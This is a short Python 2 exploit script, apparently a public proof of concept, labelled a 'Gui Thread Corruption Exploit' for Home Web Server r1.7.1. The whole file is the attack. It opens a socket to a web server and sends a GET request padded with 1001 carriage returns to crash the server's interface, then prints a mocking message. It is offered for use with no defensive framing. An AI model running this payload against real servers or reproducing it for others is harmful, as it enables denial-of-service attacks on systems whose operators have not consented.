# Echo client program
import socket

HOST = 'www.example.com'    # The remote host
pORT = 80           # The same port as used by the server
print '####################################'
print '#Home Web Server r1.7.1 (build 147)#'
print '#  Gui Thread Corruption Exploit   #'
print '#                                  #'
print '#          By: Aodrulez            #'
print '#       f3arm3d3ar@gmail.com       #'
print '#                                  #'
print '####################################'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, pORT))
p='GET '+chr(0x0d)*1001+'index.html HTTp/1.0\r\n\r\n'
s.send(p)
s.close()
print '\"'+HOST+'\'s Gui Got Corrupted :P\"     '
